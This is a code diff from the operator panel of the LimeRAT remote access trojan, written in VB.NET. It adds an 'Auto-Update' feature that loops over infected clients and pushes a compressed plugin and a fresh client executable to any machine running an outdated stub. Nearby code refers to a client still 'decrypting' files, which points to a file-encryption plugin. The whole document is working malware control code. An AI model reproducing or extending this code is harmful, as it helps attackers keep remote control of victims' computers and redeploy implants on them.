@@ -1283,7 +1283,6 @@ Public Class Main
                 result = MessageBox.Show("Client didn't finish decrypting yet.." & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)
                 If result = DialogResult.Yes Then
                     S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|3")
-
                 End If
             Else
                 S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|3")
@@ -1406,6 +1405,56 @@ Public Class Main
 
 
 
+
+#End Region
+
+#Region "Auto-Update"
+
+    Private Sub StartToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles StartToolStripMenuItem1.Click
+        Try
+            Dim result As DialogResult
+            result = MessageBox.Show("Do you want to update your clients with latest stub version?" & vbNewLine & vbNewLine & "This will only update the outdated clients." & vbNewLine & vbNewLine & "Latest LimeRAT stub is " + S_Settings.StubVer, "Auto-Update", MessageBoxButtons.YesNo, MessageBoxIcon.Question)
+            If result = DialogResult.Yes Then
+                Dim o As New OpenFileDialog
+                With o
+                    .Filter = "*.exe (*.exe)| *.exe"
+                    .InitialDirectory = Application.StartupPath
+                    .Title = "Select New-Client"
+                End With
+                If o.ShowDialog = Windows.Forms.DialogResult.OK Then
+                    AutoUpdateThread = New System.Threading.Thread(AddressOf AutoUpdate)
+                    AutoUpdateThread.Start(o.FileName)
+                End If
+            End If
+        Catch ex As Exception
+            MsgBox(ex.Message, MsgBoxStyle.Critical)
+            Return
+        End Try
+    End Sub
+
+    Private Sub StopToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles StopToolStripMenuItem1.Click
+        Try
+            AutoUpdateThread.Abort()
+        Catch ex As Exception
+        End Try
+    End Sub
+
+    Dim AutoUpdateThread As Threading.Thread
+    Private Sub AutoUpdate(ByVal ClientEXE As String)
+        Try
+            While True
+                For Each C As ListViewItem In L1.Items
+                    If C.SubItems(VER.Index).Text <> S_Settings.StubVer Then
+                        S.Send(C.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-" + "|'P'|" + "4" + "|'P'|" + IO.Path.GetFileName(ClientEXE) + "|'P'|" + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(ClientEXE), True)))
+                        Messages(C.SubItems(IP.Index).Text, "Updated to [" + S_Settings.StubVer + "] using Auto-Update")
+                    End If
+                    Threading.Thread.Sleep(500)
+                Next
+                Threading.Thread.Sleep(5000)
+            End While
+        Catch ex As Exception
+        End Try
+    End Sub
 
 #End Region
 
